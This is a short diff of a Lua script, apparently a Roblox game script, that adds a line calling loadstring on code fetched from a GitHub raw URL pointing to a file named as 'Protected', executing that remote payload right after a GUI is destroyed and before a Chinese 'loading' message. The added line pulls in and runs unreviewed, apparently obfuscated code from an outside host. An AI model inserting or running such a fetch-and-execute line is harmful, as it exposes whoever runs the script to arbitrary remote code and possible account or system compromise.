@@ -142,7 +142,7 @@ for i = 0.5, 20 do
 end
 
 ScreenGui:Destroy()
-   
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/yzc604/W/refs/heads/main/Protected_6480029127212980.lua",true))() 
 
     viuereb.Text = "加载中..."
     wait(5)
